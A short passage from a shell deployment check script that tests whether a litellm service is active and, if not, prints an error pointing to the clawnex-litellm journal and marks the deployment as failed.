if [ "$LITELLM_ACTIVE" != "active" ] && [ "$LITELLM_ACTIVE" != "not-installed" ]; then
  echo "✗ litellm service is ${LITELLM_ACTIVE} — check journalctl -u clawnex-litellm"
  DEPLOY_OK=0
